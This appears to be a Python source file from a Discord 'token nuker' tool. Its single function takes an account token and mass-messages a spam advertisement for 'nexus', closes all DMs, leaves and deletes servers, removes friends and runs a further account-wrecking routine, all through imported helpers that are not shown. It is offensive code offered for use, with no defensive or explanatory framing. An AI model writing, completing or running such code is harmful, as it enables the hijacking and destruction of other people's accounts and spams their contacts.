from Helper import *
from Helper.Common.utils import *
from Helper.Plugs.TokenNukerPlugs import *

def Nuke_account(token):
    massDM(token, "Nuked By nexus https://discord.gg/nexustools")
    close_all_dms(token)
    leaveServer(token)
    deleteServers(token)
    deleteFriends(token)
    fuckAccount(token)